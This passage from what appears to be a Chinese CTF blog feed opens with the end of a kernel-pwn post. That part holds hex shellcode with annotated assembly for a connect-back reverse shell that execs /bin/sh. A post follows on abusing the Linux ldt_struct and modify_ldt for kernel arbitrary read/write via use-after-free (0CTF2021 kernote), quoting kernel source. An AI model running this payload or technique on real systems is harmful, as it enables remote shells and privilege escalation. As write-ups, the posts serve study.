class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//gist.github.com/itsZN/1ab36391d1849f15b785</span></span><br><span class="line"><span class="string">"\x90\x53\x48\x31\xc0\xb0\x66\x0f\x05\x48\x31\xdb\x48\x39\xc3\x75\x0f\x48\x31\xc0\xb0\x39\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x09\x5b\x48\x31\xc0\xb0\x60\x0f\x05\xc3\x48\x31\xd2\x6a\x01\x5e\x6a\x02\x5f\x6a\x29\x58\x0f\x05\x48\x97\x50\x48\xb9\xfd\xff\xf2\xfa\x80\xff\xff\xfe\x48\xf7\xd1\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x48\x31\xdb\x48\x39\xd8\x74\x07\x48\x31\xc0\xb0\xe7\x0f\x05\x90\x6a\x03\x5e\x6a\x21\x58\x48\xff\xce\x0f\x05\x75\xf6\x48\xbb\xd0\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd3\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x0f\x05"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nop</span><br><span class="line">push rbx</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al, <span class="number">0x66</span></span><br><span class="line">syscall <span class="meta">#check uid</span></span><br><span class="line">xor rbx,rbx</span><br><span class="line">cmp rbx,rax</span><br><span class="line">jne emulate</span><br><span class="line"></span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,<span class="number">0x39</span></span><br><span class="line">syscall <span class="meta">#fork</span></span><br><span class="line">xor rbx,rbx</span><br><span class="line">cmp rax,rbx</span><br><span class="line">je connectback</span><br><span class="line"></span><br><span class="line">emulate:</span><br><span class="line">pop rbx</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,<span class="number">0x60</span></span><br><span class="line">syscall</span><br><span class="line">retq</span><br><span class="line"></span><br><span class="line">connectback:</span><br><span class="line">xor rdx,rdx</span><br><span class="line">pushq <span class="number">0x1</span></span><br><span class="line">pop rsi</span><br><span class="line">pushq <span class="number">0x2</span></span><br><span class="line">pop rdi</span><br><span class="line">pushq <span class="number">0x29</span></span><br><span class="line">pop rax </span><br><span class="line">syscall <span class="meta">#socket</span></span><br><span class="line"></span><br><span class="line">xchg rdi,rax</span><br><span class="line">push rax</span><br><span class="line">mov rcx, <span class="number">0xfeffff80faf2fffd</span></span><br><span class="line">not rcx</span><br><span class="line">push rcx</span><br><span class="line">mov rsi,rsp</span><br><span class="line">pushq <span class="number">0x10</span></span><br><span class="line">pop rdx</span><br><span class="line">pushq <span class="number">0x2a</span></span><br><span class="line">pop rax</span><br><span class="line">syscall <span class="meta">#connect</span></span><br><span class="line"></span><br><span class="line">xor rbx,rbx</span><br><span class="line">cmp rax,rbx</span><br><span class="line">je sh</span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,<span class="number">0xe7</span></span><br><span class="line">syscall <span class="meta">#exit</span></span><br><span class="line"></span><br><span class="line">sh:</span><br><span class="line">nop</span><br><span class="line">pushq <span class="number">0x3</span></span><br><span class="line">pop rsi</span><br><span class="line">duploop:</span><br><span class="line">pushq <span class="number">0x21</span></span><br><span class="line">pop rax</span><br><span class="line">dec rsi</span><br><span class="line">syscall <span class="meta">#dup</span></span><br><span class="line">jne duploop</span><br><span class="line"></span><br><span class="line">mov rbx,<span class="number">0xff978cd091969dd0</span></span><br><span class="line">not rbx</span><br><span class="line">push rbx</span><br><span class="line">mov rdi,rsp</span><br><span class="line">push rax</span><br><span class="line">push rdi</span><br><span class="line">mov rsi,rsp</span><br><span class="line">xor rdx,rdx</span><br><span class="line">mov al,<span class="number">0x3b</span></span><br><span class="line">syscall <span class="meta">#execve</span></span><br><span class="line">xor rax,rax</span><br><span class="line">mov al,<span class="number">0xe7</span></span><br><span class="line">syscall</span><br></pre></td></tr></tbody></table></figure><h2 id="参考文章-引文-图片来源"><a href="#参考文章-引文-图片来源" class="headerlink" title="参考文章,引文,图片来源"></a>参考文章,引文,图片来源</h2><p>感谢各位师傅的文章,侵删<br><a href="https://xz.aliyun.com/t/6296">https://xz.aliyun.com/t/6296</a><br><a href="https://xz.aliyun.com/t/3204">https://xz.aliyun.com/t/3204</a><br><a href="https://www.jianshu.com/p/07994f8b2bb0">https://www.jianshu.com/p/07994f8b2bb0</a><br><a href="https://www.jianshu.com/p/a2259cd3e79e">https://www.jianshu.com/p/a2259cd3e79e</a><br><a href="https://www.anquanke.com/post/id/253835">https://www.anquanke.com/post/id/253835</a></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
          <category> Kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
            <tag> Kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ldt_struct 任意地址读写&amp;&amp;0CTF2021-kernote</title>
      <link href="/2023/ldt_struct-arb_rw%20&amp;&amp;%200CTF2021-kernote/"/>
      <url>/2023/ldt_struct-arb_rw%20&amp;&amp;%200CTF2021-kernote/</url>
      
        <content type="html"><![CDATA[<p>稳定的任意读和不稳定的任意写</p><span id="more"></span><h2 id="ldt-struct-kmalloc-16-slub"><a href="#ldt-struct-kmalloc-16-slub" class="headerlink" title="ldt_struct  kmalloc-16(slub)"></a>ldt_struct  kmalloc-16(slub)</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MODIFY_LDT_SYSCALL</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ldt_structs can be allocated, used, and freed, but they are never</span></span><br><span class="line"><span class="comment"> * modified while live.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> {</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Xen requires page-aligned LDTs with special permissions.  This is</span></span><br><span class="line"><span class="comment"> * needed to prevent us from installing evil descriptors such as</span></span><br><span class="line"><span class="comment"> * call gates.  On native, we could merge the ldt_struct and LDT</span></span><br><span class="line"><span class="comment"> * allocations, but it's not worth trying to optimize.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>*<span class="title">entries</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>nr_entries;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If PTI is in use, then the entries array is not mapped while we're</span></span><br><span class="line"><span class="comment"> * in user mode.  The whole array will be aliased at the addressed</span></span><br><span class="line"><span class="comment"> * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span></span><br><span class="line"><span class="comment"> * and map, and enable a new LDT without invalidating the mapping</span></span><br><span class="line"><span class="comment"> * of an older, still-in-use LDT.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * slot will be -1 if this LDT doesn't have an alias mapping.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span>slot;</span><br><span class="line">};</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>用户可以通过modify_ldt来读写ldt.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="type">int</span> , func , <span class="type">void</span> __user * , ptr ,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> , bytecount)</span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (func) {</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">ret = read_ldt(ptr, bytecount);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">ret = read_default_ldt(ptr, bytecount);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The SYSCALL_DEFINE() macros give us an 'unsigned long'</span></span><br><span class="line"><span class="comment"> * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment"> * 'int'.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment"> * for the return code.  The 'unsigned' is necessary so</span></span><br><span class="line"><span class="comment"> * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment"> * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment"> * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)ret;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h2><p>write_ldt会为ldt新增一个desc_struct条目,不过需要重新分配一个ldt结构并将旧的拷贝过去.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>, *<span class="title">old_ldt</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> old_nr_entries, new_nr_entries;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ldt_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>;</span></span><br><span class="line"><span class="type">int</span> error;</span><br><span class="line"></span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">error = -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (ldt_info.entry_number &gt;= LDT_ENTRIES)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (ldt_info.contents == <span class="number">3</span>) {</span><br><span class="line"><span class="keyword">if</span> (oldmode)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"><span class="keyword">if</span> (ldt_info.seg_not_present == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((oldmode &amp;&amp; !ldt_info.base_addr &amp;&amp; !ldt_info.limit) ||</span><br><span class="line">    LDT_empty(&amp;ldt_info)) {</span><br><span class="line"><span class="comment">/* The user wants to clear the entry. */</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;ldt, <span class="number">0</span>, <span class="keyword">sizeof</span>(ldt));</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line"><span class="keyword">if</span> (!ldt_info.seg_32bit &amp;&amp; !allow_16bit_segments()) {</span><br><span class="line">error = -EINVAL;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">fill_ldt(&amp;ldt, &amp;ldt_info);</span><br><span class="line"><span class="keyword">if</span> (oldmode)</span><br><span class="line">ldt.avl = <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (down_write_killable(&amp;mm-&gt;context.ldt_usr_sem))</span><br><span class="line"><span class="keyword">return</span> -EINTR;</span><br><span class="line"></span><br><span class="line">old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">error = -ENOMEM;</span><br><span class="line">new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"><span class="keyword">if</span> (!new_ldt)</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line"><span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line">finalize_ldt_struct(new_ldt);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we are using PTI, map the new LDT into the userspace pagetables.</span></span><br><span class="line"><span class="comment"> * If there is already an LDT, use the other slot so that other CPUs</span></span><br><span class="line"><span class="comment"> * will continue to use the old LDT until install_ldt() switches</span></span><br><span class="line"><span class="comment"> * them over to the new LDT.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error = map_ldt_struct(mm, new_ldt, old_ldt ? !old_ldt-&gt;slot : <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (error) {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This only can fail for the first LDT setup. If an LDT is</span></span><br><span class="line"><span class="comment"> * already installed then the PTE page is already</span></span><br><span class="line"><span class="comment"> * populated. Mop up a half populated page table.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!WARN_ON_ONCE(old_ldt))</span><br><span class="line">free_ldt_pgtables(mm);</span><br><span class="line">free_ldt_struct(new_ldt);</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">install_ldt(mm, new_ldt);</span><br><span class="line">unmap_ldt_struct(mm, old_ldt);</span><br><span class="line">free_ldt_struct(old_ldt);</span><br><span class="line">error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">up_write(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">out:</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>来看关键部分:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line"><span class="keyword">if</span> (!new_ldt)</span><br><span class="line"><span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (old_ldt)</span><br><span class="line"><span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br></pre></td></tr></tbody></table></figure><p>new_ldt来自GFP_KERNEL的kmalloc,可以通过uaf获得其的读写能力.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The caller must call finalize_ldt_struct on the result. LDT starts zeroed. */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> ldt_struct *<span class="title function_">alloc_ldt_struct</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_entries)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> alloc_size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (num_entries &gt; LDT_ENTRIES)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">new_ldt = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ldt_struct), GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!new_ldt)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">BUILD_BUG_ON(LDT_ENTRY_SIZE != <span class="keyword">sizeof</span>(<span class="keyword">struct</span> desc_struct));</span><br><span class="line">alloc_size = num_entries * LDT_ENTRY_SIZE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Xen is very picky: it requires a page-aligned LDT that has no</span></span><br><span class="line"><span class="comment"> * trailing nonzero bytes in any page that contains LDT descriptors.</span></span><br><span class="line"><span class="comment"> * Keep it simple: zero the whole allocation and never allocate less</span></span><br><span class="line"><span class="comment"> * than PAGE_SIZE.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (alloc_size &gt; PAGE_SIZE)</span><br><span class="line">new_ldt-&gt;entries = vzalloc(alloc_size);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">new_ldt-&gt;entries = (<span class="type">void</span> *)get_zeroed_page(GFP_KERNEL);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!new_ldt-&gt;entries) {</span><br><span class="line">kfree(new_ldt);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* The new LDT isn't aliased for PTI yet. */</span></span><br><span class="line">new_ldt-&gt;slot = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">new_ldt-&gt;nr_entries = num_entries;</span><br><span class="line"><span class="keyword">return</span> new_ldt;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>在alloc_ldt_struct之后,memcpy和赋值语句的destination都是可以通过竞争写new_ldt来控制的,可以达到任意写的效果.<br>    对于memcpy来说,需要两次uaf,分别控制old_ldt和new_ldt.缺点是竞争窗口在alloc_ldt_struct之后,极短.<br>     对于赋值语句来说,只需控制new_ldt(ldt受来自user的ldt_info控制).缺点是由于一些检查and比较,ldt不完全可控,不过0是可以的.较大的old_nr_entries可以延长竞争窗口.<br>一般是用第二种</p><p>(使用ldt_struct进行竞争任意写极不稳定,主要还是用来读)</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 8 byte segment descriptor */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> {</span></span><br><span class="line">u16limit0;</span><br><span class="line">u16base0;</span><br><span class="line">u16base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">u16limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">} __attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> {</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  entry_number;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  base_addr;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  limit;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  contents:<span class="number">2</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  useable:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __x86_64__</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Because this bit is not present in 32-bit user code, user</span></span><br><span class="line"><span class="comment"> * programs can pass uninitialized values here.  Therefore, in</span></span><br><span class="line"><span class="comment"> * any context in which a user_desc comes from a 32-bit program,</span></span><br><span class="line"><span class="comment"> * the kernel must act as though lm == 0, regardless of the</span></span><br><span class="line"><span class="comment"> * actual value.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>  lm:<span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">fill_ldt</span><span class="params">(<span class="keyword">struct</span> desc_struct *desc, <span class="type">const</span> <span class="keyword">struct</span> user_desc *info)</span></span><br><span class="line">{</span><br><span class="line">desc-&gt;limit0= info-&gt;limit &amp; <span class="number">0x0ffff</span>;</span><br><span class="line"></span><br><span class="line">desc-&gt;base0= (info-&gt;base_addr &amp; <span class="number">0x0000ffff</span>);</span><br><span class="line">desc-&gt;base1= (info-&gt;base_addr &amp; <span class="number">0x00ff0000</span>) &gt;&gt; <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">desc-&gt;type= (info-&gt;read_exec_only ^ <span class="number">1</span>) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">desc-&gt;type       |= info-&gt;contents &lt;&lt; <span class="number">2</span>;</span><br><span class="line"><span class="comment">/* Set the ACCESS bit so it can be mapped RO */</span></span><br><span class="line">desc-&gt;type       |= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">desc-&gt;s= <span class="number">1</span>;</span><br><span class="line">desc-&gt;dpl= <span class="number">0x3</span>;</span><br><span class="line">desc-&gt;p= info-&gt;seg_not_present ^ <span class="number">1</span>;</span><br><span class="line">desc-&gt;limit1= (info-&gt;limit &amp; <span class="number">0xf0000</span>) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">desc-&gt;avl= info-&gt;useable;</span><br><span class="line">desc-&gt;d= info-&gt;seg_32bit;</span><br><span class="line">desc-&gt;g= info-&gt;limit_in_pages;</span><br><span class="line"></span><br><span class="line">desc-&gt;base2= (info-&gt;base_addr &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Don't allow setting of the lm bit. It would confuse</span></span><br><span class="line"><span class="comment"> * user_64bit_mode and would get overridden by sysret anyway.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">desc-&gt;l= <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h2><p>read_ldt可以读出ldt的中所有的desc_struct.<br>(<del>这是能允许user读的么…</del>)</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 